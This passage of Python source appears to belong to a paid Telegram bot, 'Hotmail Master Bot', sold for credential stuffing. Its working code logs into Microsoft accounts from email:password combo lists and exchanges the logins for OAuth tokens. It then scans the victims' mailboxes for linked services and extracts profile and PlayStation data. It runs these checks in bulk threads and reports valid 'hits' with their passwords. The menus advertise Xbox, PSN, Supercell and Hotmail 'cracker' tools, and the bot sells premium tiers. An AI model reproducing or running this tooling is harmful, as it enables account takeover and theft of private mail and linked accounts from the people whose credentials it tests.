            r1 = session.get(url1, headers=headers1, timeout=15)
            txt1 = r1.text
            
            if "Neither" in txt1 or "Both" in txt1 or "Placeholder" in txt1 or "OrgId" in txt1:
                return {"status": "BAD", "reason": "Not Hotmail/Outlook account"}
            
            if "MSAccount" not in txt1:
                return {"status": "BAD", "reason": "Not Microsoft account"}
            
            # Step 2: Get login page
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            
            r2 = session.get(url2, allow_redirects=True, timeout=15)
            
            # Extract PPFT and post URL
            url_post_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name="PPFT".*?value="([^"]+)"', r2.text)
            
            if not ppft_match:
                ppft_match = re.search(r'name=\\"PPFT\\".*?value=\\"([^"]+)"', r2.text)
            
            if not url_post_match or not ppft_match:
                return {"status": "ERROR", "reason": "Failed to extract login parameters"}
            
            post_url = url_post_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            # Step 3: Submit credentials
            login_data = {
                "i13": "1",
                "login": email,
                "loginfmt": email,
                "type": "11",
                "LoginOptions": "1",
                "passwd": password,
                "PPFT": ppft,
                "PPSX": "PassportR",
                "NewUser": "1",
                "FoundMSAs": "",
                "i19": "9960"
            }
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            r3_text = r3.text.lower()
            
            # Check for errors
            if "incorrect" in r3_text or "password is incorrect" in r3_text:
                return {"status": "BAD", "reason": "Wrong password"}
            
            if "identity/confirm" in r3_text or "2fa" in r3_text or "verify" in r3_text:
                return {"status": "2FA", "reason": "2FA required"}
            
            if "consent" in r3_text:
                return {"status": "2FA", "reason": "Consent required"}
            
            if "abuse" in r3_text or "suspended" in r3_text:
                return {"status": "BAD", "reason": "Account suspended"}
            
            # Get authorization code
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "reason": "No redirect"}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "reason": "No auth code"}
            
            auth_code = code_match.group(1)
            
            # Get CID from cookies
            cid = session.cookies.get("MSPCID", "")
            if not cid:
                cid = session.cookies.get("MSPOK", "")
            if not cid:
                return {"status": "BAD", "reason": "No CID"}
            cid = cid.upper()
            
            # Step 4: Exchange for access token
            token_data = {
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": auth_code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            
            r4 = session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=token_data,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=15
            )
            
            if r4.status_code != 200 or "access_token" not in r4.text:
                return {"status": "ERROR", "reason": "Token exchange failed"}
            
            token_json = r4.json()
            access_token = token_json.get("access_token")
            
            if not access_token:
                return {"status": "ERROR", "reason": "No access token"}
            
            # Step 5: Get mailbox data and scan for services
            services, service_counts = self._scan_mailbox(email, access_token, cid)
            
            # Filter by keywords if provided
            if keywords:
                filtered_services = []
                filtered_counts = {}
                for s in services:
                    if s in keywords:
                        filtered_services.append(s)
                        filtered_counts[s] = service_counts.get(s, 0)
                services = filtered_services
                service_counts = filtered_counts
            
            # Step 6: Get profile information
            profile = extract_profile_info(access_token, cid)
            
            # Step 7: Get PSN details if PlayStation detected
            psn_details = {}
            if "PlayStation" in services:
                psn_details = extract_psn_details(access_token, cid)
            
            return {
                "status": "HIT",
                "email": email,
                "password": password,
                "services": services,
                "service_counts": service_counts,
                "profile": profile,
                "psn_details": psn_details,
                "cid": cid
            }
            
        except requests.Timeout:
            return {"status": "ERROR", "reason": "Timeout"}
        except Exception as e:
            logger.debug(f"Check error for {email}: {str(e)}")
            return {"status": "ERROR", "reason": str(e)[:50]}
        finally:
            try:
                session.close()
            except:
                pass
    
    def _scan_mailbox(self, email: str, access_token: str, cid: str) -> Tuple[List[str], Dict[str, int]]:
        """Scan mailbox for service emails and get message counts"""
        try:
            url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
            headers = {
                "x-owa-sessionid": cid,
                "authorization": f"Bearer {access_token}",
                "user-agent": self.user_agent,
                "action": "StartupData",
                "content-type": "application/json"
            }
            
            response = requests.post(url, headers=headers, data="", timeout=15)
            content = response.text.lower() if response.status_code == 200 else ""
            
            found_services = []
            service_counts = {}
            
            # Check each service
            for service_name, domains in SERVICES_ALL.items():
                for domain in domains:
                    domain_lower = domain.lower()
                    if domain_lower in content:
                        # Verify it's a real service email
                        is_confirmed = False
                        
                        if f"@{domain_lower}" in content:
                            is_confirmed = True
                        elif f"noreply@{domain_lower}" in content or f"no-reply@{domain_lower}" in content:
                            is_confirmed = True
                        elif f"{domain_lower}/" in content or f"www.{domain_lower}" in content:
                            is_confirmed = True
                        elif service_name in ["Facebook", "Instagram", "TikTok", "Twitter/X"]:
                            if domain_lower in content and ("@" in content or "noreply" in content):
                                is_confirmed = True
                        
                        if is_confirmed:
                            # Count occurrences
                            count = content.count(domain_lower)
                            found_services.append(service_name)
                            service_counts[service_name] = max(service_counts.get(service_name, 0), count)
                            break
            
            # Remove duplicates while preserving order
            unique_services = []
            seen = set()
            for service in found_services:
                if service not in seen:
                    seen.add(service)
                    unique_services.append(service)
            
            return unique_services, service_counts
            
        except Exception:
            return [], {}


# ==================== SCANNER ENGINE (WRAPPER) ====================

class ScannerEngine:
    """Main scanner engine for the bot - wraps HotmailChecker"""
    
    def __init__(self, timeout: int = 15):
        self.timeout = timeout
        self.checker = HotmailChecker()
    
    def check_single(self, email: str, password: str, keywords: List[str] = None) -> Dict:
        """Check a single account"""
        return self.checker.check_account(email, password, keywords)
    
    def check_batch(self, combos: List[str], keywords: List[str] = None,
                    threads: int = 20, progress_callback=None) -> List[Dict]:
        """Check multiple accounts in batch"""
        results = []
        lock = Lock()
        completed = 0
        total = len(combos)
         
        def worker(combo):
            nonlocal completed
            try:
                if ':' in combo:
                    email, pwd = combo.split(':', 1)
                else:
                    email, pwd = combo, ''
                
                res = self.check_single(email.strip(), pwd.strip(), keywords)
                with lock:
                    results.append(res)
                    completed += 1
                    if progress_callback:
                        progress_callback(completed, total)
            except Exception as e:
                logger.error(f"Worker error: {e}")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker, combo) for combo in combos]
            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
        
        return results


# ==================== MAIN BOT CLASS ====================
class HotmailMasterBot:
    def __init__(self, token: str, admin_ids: List[int], channels: List[Tuple[str, str]]):
        self.token = token
        self.admin_ids = admin_ids
        self.channels = channels
        self.key_manager = KeyManager()
        self.giveaway_manager = GiveawayManager()  # ✨ Initialize giveaway manager
        self.zip_creator = ResultZipCreator()
        self.user_sessions: Dict[int, Dict[str, Any]] = {}
        self.active_scans: Dict[int, Dict[str, Any]] = {}  # Regular scans
        self.active_premium_scans: Dict[int, Dict[str, Any]] = {}  # Premium scans
        self.pending_files: Dict[int, Dict[str, Any]] = {}
        self.pending_payments: Dict[str, Dict[str, Any]] = {}
        self.status_messages: Dict[int, int] = {}
        self.status_lock = Lock()
        self.leaderboard_lock = Lock()  # For leaderboard updates
        self.user_cracked_count: Dict[int, int] = {}  # Track user cracked counts
        self._last_edit_cache: Dict[int, str] = {}
        self._callback_queue: asyncio.Queue = None  # High-pressure response queue
        self._pending_callbacks: Dict[str, float] = {}  # Deduplicate rapid callbacks

        # Proxy manager for Crunchyroll
        self.crunchyroll_proxy_manager = ProxyManager()

        # Initialize all engines
        self.scanner_engine = ScannerEngine()
        self.brute_engine = BruteEngine()
        self.mc_engine = MCEngine()
        self.rewards_engine = RewardsEngine()
        self.psn_engine = PSNAccountChecker(debug=False)
        self.crunchyroll_engine = CrunchyrollAccountChecker(proxy_manager=self.crunchyroll_proxy_manager)
        self.imap_engine = IMAPAccountChecker()
        self.imap_inbox_engine = None
        self.hotmail_bruter_engine = HotmailBruterEngine()

        # Initialize Supercell and Xbox Cracker engines
        self.supercell_engine = None
        self.xbox_cracker_engine = None
        self.xbox_engine = None
        
        if SupercellEngine:
            try:
                self.supercell_engine = SupercellEngine()
                logger.info("✅ Supercell Engine initialized")
            except Exception as e:
                logger.error(f"❌ Failed to initialize Supercell Engine: {e}")
        else:
            logger.warning("⚠️ SupercellEngine not available (supercell_engine.py not found)")
        
        if XboxCrackerEngine:
            try:
                self.xbox_cracker_engine = XboxCrackerEngine()
                logger.info("✅ Xbox Cracker Engine initialized")
            except Exception as e:
                logger.error(f"❌ Failed to initialize Xbox Cracker Engine: {e}")
        else:
            logger.warning("⚠️ XboxCrackerEngine not available (xbox_cracker_engine.py not found)")
        
        if XboxEngine:
            try:
                self.xbox_engine = XboxEngine()
                logger.info("✅ Xbox Engine (Original) initialized")
            except Exception as e:
                logger.error(f"❌ Failed to initialize Xbox Engine: {e}")
        else:
            logger.warning("⚠️ XboxEngine not available (xbox_engine.py not found)")

        if IMAP_INBOX_AVAILABLE:
            self.imap_inbox_engine = IMAPInboxEngine(proxy_manager=None, timeout=25, debug=False)
        
        # Initialize custom inbox scanner with country detection
        if CUSTOM_INBOX_AVAILABLE:
            self.custom_inbox_scanner = CustomInboxScanner(proxy_list=None, timeout=25)
        else:
            self.custom_inbox_scanner = CustomInboxScanner()

        request = HTTPXRequest(connect_timeout=15.0, read_timeout=20.0, write_timeout=15.0, pool_timeout=15.0)
        self.app = Application.builder().token(token).request(request).concurrent_updates(True).build()
        self._setup_handlers()
        logger.info(f"✅ Hotmail Master Bot initialized with {TOTAL_KEYWORDS} services")

    def _setup_handlers(self):
        # HIGHEST PRIORITY: /start responds first, immediately
        self.app.add_handler(CommandHandler("start", self.cmd_start), group=0)
        
        # HIGH PRIORITY: All other commands in group 1
        self.app.add_handler(CommandHandler("redeem", self.cmd_redeem), group=1)
        self.app.add_handler(CommandHandler("buy", self.cmd_buy), group=1)
        self.app.add_handler(CommandHandler("help", self.cmd_help), group=1)
        self.app.add_handler(CommandHandler("stats", self.cmd_stats), group=1)
        self.app.add_handler(CommandHandler("keyword_inbox", self.cmd_keyword_inbox), group=1)
        self.app.add_handler(CommandHandler("broadcast", self.cmd_broadcast_admin), group=1)
        self.app.add_handler(CommandHandler("adminauth", self.cmd_admin_auth), group=1)
        self.app.add_handler(CommandHandler("admindelete", self.cmd_admin_delete), group=1)
        self.app.add_handler(CommandHandler("syncchannel", self.cmd_sync_channel), group=1)
        self.app.add_handler(CommandHandler("ban", self.cmd_ban), group=1)
        self.app.add_handler(CommandHandler("unban", self.cmd_unban), group=1)
        self.app.add_handler(CommandHandler("price", self.cmd_price), group=1)
        self.app.add_handler(CommandHandler("stop", self.cmd_stop), group=1)
        self.app.add_handler(CommandHandler("live", self.cmd_live), group=1)
        
        # NORMAL PRIORITY: Callbacks and messages in group 2
        self.app.add_handler(PreCheckoutQueryHandler(self.pre_checkout_handler), group=2)
        self.app.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, self.successful_payment_handler), group=2)
        self.app.add_handler(CallbackQueryHandler(self.handle_callback), group=2)
        self.app.add_handler(MessageHandler(filters.Document.TEXT & ~filters.COMMAND, self.handle_document), group=2)
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text), group=2)
        self.app.add_error_handler(self.error_handler)

    # ==================== KEYBOARD LAYOUTS ====================
    def get_main_keyboard(self, user_id: int) -> InlineKeyboardMarkup:
        is_admin = user_id in self.admin_ids
        keyboard = []
        if is_admin:
            keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="menu_admin")])
        keyboard.extend([
            [InlineKeyboardButton("🔥 Cracker", callback_data="menu_cracker")],
            [InlineKeyboardButton("🔑 Select Services", callback_data="menu_keywords")],
            [InlineKeyboardButton("📊 Current Scans", callback_data="menu_current_scans")],
            [InlineKeyboardButton("🌟 Premium Scans", callback_data="menu_premium_scans")],
            [InlineKeyboardButton("🏆 Leaderboards", callback_data="menu_leaderboards")],
            [InlineKeyboardButton("🎁 Invite Rewards", callback_data="menu_invite_rewards")],
            [InlineKeyboardButton("👤 My Profile", callback_data="menu_profile")],
            [InlineKeyboardButton("📊 Bot Status", callback_data="menu_status")],
            [InlineKeyboardButton("💎 Buy Premium", callback_data="cmd_buy")],
            [InlineKeyboardButton("🚪 Exit", callback_data="menu_exit")]
        ])
        return InlineKeyboardMarkup(keyboard)

    def get_cracker_keyboard(self) -> InlineKeyboardMarkup:
        keyboard = [
            [InlineKeyboardButton("🎯 Custom Keyword Inbox (Full Data)", callback_data="cracker_keyword_inbox")],
            [InlineKeyboardButton("📋 My Selected Services", callback_data="cracker_preloaded")],
            [InlineKeyboardButton("⚡ Brute Root", callback_data="cracker_brute_root")],
            [InlineKeyboardButton("💎 Rewards Cracker", callback_data="cracker_rewards")],
            [InlineKeyboardButton("🎮 PSN Cracker", callback_data="cracker_psn")],
            [InlineKeyboardButton("🎮 Xbox Cracker", callback_data="cracker_xbox"),
             InlineKeyboardButton("🎮 Xbox + Minecraft + GP", callback_data="cracker_xbox_engine")],
            [InlineKeyboardButton("🍀 Supercell Cracker", callback_data="cracker_supercell")],
            [InlineKeyboardButton("📧 Mix Checker", callback_data="cracker_imap")],
            [InlineKeyboardButton("📧 Mix Inboxer", callback_data="cracker_imap_inboxer")],
            [InlineKeyboardButton("🔥 Hotmail Bruter", callback_data="cracker_hotmail_bruter")],
            [InlineKeyboardButton("🌍 Country Cracker", callback_data="cracker_country")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="menu_main")]
        ]
        return InlineKeyboardMarkup(keyboard)

    def get_buy_keyboard(self) -> InlineKeyboardMarkup:
        keyboard = [
            [InlineKeyboardButton("💎 FREE (Daily 10k lines)", callback_data="buy_free")],
            [InlineKeyboardButton("⚡ 3 DAYS - $5", callback_data="buy_three_days")],
            [InlineKeyboardButton("🔥 1 WEEK - $15", callback_data="buy_weekly")],
            [InlineKeyboardButton("💎 1 MONTH - $35", callback_data="buy_monthly")],
            [InlineKeyboardButton("⭐ 3 MONTHS - $50", callback_data="buy_three_months")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="menu_main")]
        ]
        return InlineKeyboardMarkup(keyboard)

    def get_admin_keyboard(self) -> InlineKeyboardMarkup:
        keyboard = [
            [InlineKeyboardButton("🔑 1H", callback_data="admin_gen_1h"),
             InlineKeyboardButton("🔑 3H", callback_data="admin_gen_3h"),
             InlineKeyboardButton("🔑 7H", callback_data="admin_gen_7h"),
             InlineKeyboardButton("🔑 10H", callback_data="admin_gen_10h")],
            [InlineKeyboardButton("⏱️ Custom Days", callback_data="admin_gen_custom"),
             InlineKeyboardButton("📦 Bulk Gen", callback_data="admin_bulk")],
            [InlineKeyboardButton("➕ Add Premium", callback_data="admin_add_premium"),
             InlineKeyboardButton("👥 View Users", callback_data="admin_view_users")],
            [InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban"),
             InlineKeyboardButton("✅ Unban User", callback_data="admin_unban")],
            [InlineKeyboardButton("📋 Unused Keys", callback_data="admin_view_unused"),
             InlineKeyboardButton("🗑️ Del Unused", callback_data="admin_del_unused")],
            [InlineKeyboardButton("🔑 Redeemed Keys", callback_data="admin_view_redeemed"),
             InlineKeyboardButton("🗑️ Delete Redeemed", callback_data="admin_del_redeemed")],
            [InlineKeyboardButton("🎁 Free Gift Lines", callback_data="admin_free_gift"),
             InlineKeyboardButton("❌ Delete All Keys", callback_data="admin_del_all")],
            [InlineKeyboardButton("🎁 Start Giveaway", callback_data="admin_start_giveaway"),
             InlineKeyboardButton("🏁 End Giveaway", callback_data="admin_end_giveaway")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="menu_main")]
        ]
        return InlineKeyboardMarkup(keyboard)

    def get_channel_keyboard(self) -> InlineKeyboardMarkup:
        """Create keyboard with channel join links"""
        keyboard = []
        
        if not self.channels:
            # If no channels configured, just show continue button
            keyboard.append([InlineKeyboardButton("✅ Continue", callback_data="check_joined")])
        else:
            # Add buttons for each channel
            for idx, (url, username) in enumerate(self.channels, 1):
                if username:
                    # Convert to string if needed (handle int usernames)
                    username_str = str(username).lstrip('@')
                    button_text = f"🔗 Join Channel {idx}: {username_str}"
                else:
                    button_text = f"🔗 Join Channel {idx} (Private)"
                
                keyboard.append([InlineKeyboardButton(button_text, url=url)])
            
            keyboard.append([InlineKeyboardButton("✅ I Joined All Channels", callback_data="check_joined")])
        
        return InlineKeyboardMarkup(keyboard)

    def get_cancel_keyboard(self, callback_data: str = "menu_main") -> InlineKeyboardMarkup:
        return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data=callback_data)]])

    def get_keyboard_page(self, user_id: int, page: int = 0) -> InlineKeyboardMarkup:
        per_page = 10
        total = TOTAL_KEYWORDS
        pages = (total + per_page - 1) // per_page if total > 0 else 1
        start = page * per_page
        end = min(start + per_page, total)
        selected = self.user_sessions.get(user_id, {}).get("selected_keywords", [])
        keyboard = []
        
        # Show service names with checkmarks
        for display_name in DISPLAY_NAMES[start:end]:
            cb = f"kw_toggle_{page}_{display_name}"
            mark = "✅ " if display_name in selected else "⬜ "
            short_name = display_name[:37] + "..." if len(display_name) > 40 else display_name
            keyboard.append([InlineKeyboardButton(mark + short_name, callback_data=cb)])
        
        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"kw_page_{page-1}"))
        if page < pages - 1:
            nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"kw_page_{page+1}"))
        if nav:
            keyboard.append(nav)
        
        keyboard.append([
            InlineKeyboardButton("✅ Select All", callback_data="kw_select_all"),
            InlineKeyboardButton("❌ Deselect All", callback_data="kw_deselect_all")
        ])
        
        selected_count = len(selected)
        keyboard.append([InlineKeyboardButton(f"📊 Selected: {selected_count}/{total} services", callback_data="kw_noop")])
        keyboard.append([InlineKeyboardButton("✅ Confirm Selection", callback_data="kw_confirm")])
        keyboard.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_main")])
        return InlineKeyboardMarkup(keyboard)

    def get_live_stats_keyboard(self, user_id: int) -> InlineKeyboardMarkup:
        has_active = user_id in self.active_scans
        keyboard = []
        if has_active:
            keyboard.append([InlineKeyboardButton("🛑 Stop Scan", callback_data="live_stop")])
        keyboard.append([InlineKeyboardButton("🔄 Refresh", callback_data="live_refresh")])
        keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="menu_main")])
        return InlineKeyboardMarkup(keyboard)

    def get_proxy_keyboard(self) -> InlineKeyboardMarkup:
        keyboard = [
            [InlineKeyboardButton("📁 Upload Proxy File", callback_data="crunchyroll_upload_file")],
            [InlineKeyboardButton("📝 Enter Proxies Manually", callback_data="crunchyroll_manual")],
            [InlineKeyboardButton("🔙 Back", callback_data="menu_cracker")]
        ]
        return InlineKeyboardMarkup(keyboard)

    # ==================== COMMAND HANDLERS ====================
    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not update.effective_user:
            return
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        self.key_manager.register_user_if_new(
            user.id, username=user.username or "",
            first_name=user.first_name or "",
            last_name=user.last_name or ""
        )
        logger.info(f"User {user.id} ({user.username}) started the bot")
        
        # Check if banned (fast, in-memory lookup)
        if self.key_manager.is_banned(user.id):
            await update.message.reply_text("🚫 You are banned from using this bot. Contact @NoMan8x8 for assistance.")
            return
        
        # ==================== STRICT CHANNEL MEMBERSHIP CHECK ====================
        # Check membership BEFORE showing welcome menu
        try:
            from main import Config
            if Config.FORCE_CHANNEL_MEMBERSHIP:
                logger.info(f"Checking channel membership for user {user.id}...")
                is_member = await self._check_membership(user.id, context)
                if not is_member:
                    # User hasn't joined all channels - DENY ACCESS
                    logger.warning(f"❌ User {user.id} denied: not in all required channels")
                    await update.message.reply_text(
                        "❌ **ACCESS DENIED!**\n\n"
                        "You must join ALL channels below to use this bot:\n",
                        reply_markup=self.get_channel_keyboard(), 
                        parse_mode=ParseMode.MARKDOWN
                    )
                    return
                else:
                    logger.info(f"✅ User {user.id} verified in all channels - access granted")
                    # Update verification timestamp
                    user_data = self.key_manager.users.setdefault(str(user.id), {})
                    user_data["last_channel_verify_time"] = datetime.now().isoformat()
                    self.key_manager.users[str(user.id)] = user_data
        except Exception as e:
            logger.error(f"Error in channel check: {e}")
            # Don't block user if check fails - but log it
        
        # Handle invite code if provided (non-blocking)
        if context.args and len(context.args) > 0:
            arg = context.args[0]
            if arg.startswith("inv_"):
                invite_code = arg.replace("inv_", "")
                for uid, user_data in self.key_manager.users.items():
                    if user_data.get("invite_code") == invite_code:
                        referrer_id = int(uid)
                        if self.key_manager.set_referrer(user.id, referrer_id):
                            logger.info(f"User {user.id} joined via invite from {referrer_id}")
                        break
        
        # ⚡ INSTANT RESPONSE - Send welcome menu (only after membership verified)
        await self._send_welcome_message(chat_id, user, context)

    async def cmd_redeem(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not context.args:
            await update.message.reply_text(
                "🔑 **Redeem Premium Key**\n\nUsage: `/redeem <key>`\n\nExample: `/redeem HMB-XXXXXXXXXXXX`\n\n💰 **Pricing:**\n• WEEKLY: $8 / 300 TL\n• MONTHLY: $12 / 500 TL\n• YEARLY: $100 / 4400 TL\n\nContact @NoMan8x8 to purchase keys.",
                parse_mode=ParseMode.MARKDOWN
            )
            return
        key = context.args[0].strip().upper()
        success, message = self.key_manager.redeem_key(user_id, key)
        if success:
            await update.message.reply_text(f"🎉 **Premium Activated!** ✅\n\n{message}\n\nYou now have unlimited access to all features!", parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text(f"❌ **Redemption Failed**\n\n{message}\n\nContact @NoMan8x8 for assistance.", parse_mode=ParseMode.MARKDOWN)

    async def cmd_buy(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "💎 **Purchase Premium Access**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "**🎯 WHY SHOULD YOU UPGRADE?**\n\n"
            "• FREE plan limits: 10,000 lines/day, 100 threads, 3 services\n"
            "• Premium gives you UNLIMITED lines, more threads, and NO QUEUE WAITING\n"
            "• Process 10x more combos per day\n"
            "• Get results faster with 200-220 threads\n"
            f"• Use ALL {TOTAL_KEYWORDS}+ services at once\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "**💰 PREMIUM PLANS:**\n\n"
            "┌─────────────────────────────────────────────────────────────┐\n"
            "│  🆓 FREE                                                   │\n"
            "│  • 10,000 lines/day                                        │\n"
            "│  • 100 threads                                             │\n"
            "│  • 3 services only                                         │\n"
            "│  • Single scan at a time                                   │\n"
            "└─────────────────────────────────────────────────────────────┘\n\n"
            "┌─────────────────────────────────────────────────────────────┐\n"
            "│  ⚡ 3 DAYS – $5                                             │\n"
            "│  • UNLIMITED lines/day                                     │\n"
            "│  • 140 threads                                             │\n"
            "│  • Unlimited services                                      │\n"
            "│  • Try premium for just $5                                 │\n"
            "│  • 3 files at once                                         │\n"
            "│  • Perfect for testing                                     │\n"
            "└─────────────────────────────────────────────────────────────┘\n\n"
            "┌─────────────────────────────────────────────────────────────┐\n"
            "│  🔥 WEEKLY – $15                                            │\n"
            "│  • UNLIMITED lines/day                                     │\n"
            "│  • 150 threads                                             │\n"
            "│  • Unlimited services                                      │\n"
            "│  • No queue waiting                                        │\n"
            "│  • 5 files at once                                         │\n"
            "│  • Perfect for active users                                │\n"
            "└─────────────────────────────────────────────────────────────┘\n\n"
            "┌─────────────────────────────────────────────────────────────┐\n"
            "│  💎 MONTHLY – $35                                           │\n"
            "│  • UNLIMITED daily lines                                   │\n"
            "│  • 200 threads                                             │\n"
            "│  • Unlimited services                                      │\n"
            "│  • No queue waiting                                        │\n"
            "│  • 5 files at once                                         │\n"
            "│  • Best for regular users                                  │\n"
            "└─────────────────────────────────────────────────────────────┘\n\n"
            "┌─────────────────────────────────────────────────────────────┐\n"
            "│  ⭐ 3 MONTHS – $50 (BEST VALUE)                             │\n"
            "│  • UNLIMITED daily lines                                   │\n"
            "│  • 220 threads (pro speed)                                 │\n"
            "│  • Unlimited services                                      │\n"
            "│  • No queue waiting                                        │\n"
            "│  • 8 files at once                                         │\n"
            "│  • Best value overall                                      │\n"
            "└─────────────────────────────────────────────────────────────┘\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "**💳 Payment Methods:**\n"
            "• Cryptocurrency (BTC, USDT, ETH)\n"
            "• PayPal\n"
            "• Credit Card\n"
            "• Bank Transfer\n\n"
            "**🛒 How to buy:**\n"
            "1. Click the plan you want below\n"
            "2. Contact @NoMan8x8 with proof\n"
            "3. Receive your key instantly\n\n"
            "⚡ Average delivery time: 5-10 minutes\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.MARKDOWN, reply_markup=self.get_buy_keyboard()
        )

    async def cmd_price(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text(
            "💰 **Premium Pricing List**\n\n"
            "```\n"
            "Plan         Duration  Price   Lines/day   Threads   Services  Multi-scan\n"
            "──────────────────────────────────────────────────────────────────────────\n"
            "FREE         -         FREE    10,000      100       3         1\n"
            "3 DAYS       3 days    $5      Unlimited   140       Unlimited 3\n"
            "WEEKLY       7 days    $15     Unlimited   150       Unlimited 5\n"
            "MONTHLY      30 days   $35     Unlimited   200       Unlimited 5\n"
            "3 MONTHS     90 days   $50     Unlimited   220       Unlimited 8\n"
            "```\n\n"
            f"**🎯 Available Services:** {TOTAL_KEYWORDS}+ services including:\n"
            "• Social Media (Facebook, Instagram, TikTok, Twitter, etc.)\n"
            "• Gaming (Steam, Xbox, PlayStation, Roblox, Minecraft, etc.)\n"
            "• Streaming (Netflix, Spotify, Disney+, HBO Max, etc.)\n"
            "• Shopping (Amazon, eBay, Walmart, etc.)\n"
            "• Finance & Crypto (PayPal, Binance, Coinbase, etc.)\n"
            "• AI Platforms (ChatGPT, Claude, Gemini, etc.)\n"
            "• Education (Udemy, Coursera, Duolingo, etc.)\n\n"
            "💳 **Payment Methods:**\n• Cryptocurrency (BTC, USDT, ETH)\n• PayPal\n• Credit Card\n• Bank Transfer\n\n"
            "🛒 **How to buy:**\n1. Use /buy command\n2. Click the plan you want\n3. Contact @NoMan8x8 with proof\n4. Receive your key instantly",
            parse_mode=ParseMode.MARKDOWN
        )

    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        help_text = (
            f"📖 **Hotmail Master Bot Help**\n\n**Commands:**\n"
            "/start - Show main menu\n"
            "/redeem <key> - Activate premium\n"
            "/buy - Purchase premium access\n"
            "/price - Show pricing details\n"
            "/stats - Show your statistics\n"
            "/live - View live scanning stats\n"
            "/stop - Stop active scan\n"
            "/help - Show this message\n\n"
            "**Features:**\n"
            "• 📧 Custom Inbox Keyword Search\n"
            f"• 📋 My Selected Services - {TOTAL_KEYWORDS}+ services!\n"
            "• ⚡ High-Speed Brute Validation\n"
            "• ⛏️ Minecraft Full Capture\n"
            "• 💎 Bing Rewards Points Checker\n"
            "• 🎮 PSN Account Data\n"
            "• 🍿 Crunchyroll Subscription (REQUIRES PROXY)\n"
            "• 📧 Universal IMAP Checker\n"
            "• 📧 IMAP Inboxer - Multi-keyword search\n"
            "• 🔥 Hotmail Bruter\n\n"
            "**ZIP Results Format:**\n"
            "Results are saved as:\n"
            "`service_domain_at_provider_com.txt`\n"
            "Example: `playstation_com.txt`\n\n"
            "💰 **Pricing:**\n"
            "• FREE: 5k lines/day, 100 threads, 3 services\n"
            "• WEEKLY: $8 – 15k lines, 150 threads\n"
            "• MONTHLY: $12 – Unlimited, 200 threads\n"
            "• YEARLY: $100 – Unlimited, 250 threads\n\n"
            "Contact @NoMan8x8 to buy!"
        )
        await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN)

    async def cmd_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        stats = self.key_manager.get_user_stats(user_id)
        is_premium = self.key_manager.is_premium(user_id)
        tier = self._get_user_tier(user_id)
        limits = PREMIUM_TIERS[tier]
        text = f"📊 **Your Statistics**\n\n👤 User ID: `{user_id}`\n⭐ Status: **{limits['name']}**\n"
        if is_premium:
            expiry = self.key_manager.get_premium_expiry(user_id)
            if expiry:
                text += f"⏰ Expires: `{expiry.strftime('%Y-%m-%d %H:%M')}`\n"
        text += f"📈 **Scanning Stats:**\n• Total Checked: `{stats.get('total_checked', 0)}`\n• Total Hits: `{stats.get('total_hits', 0)}`\n• Success Rate: `{(stats.get('total_hits', 0) / max(stats.get('total_checked', 1), 1) * 100):.1f}%`\n\n"
        if not is_premium:
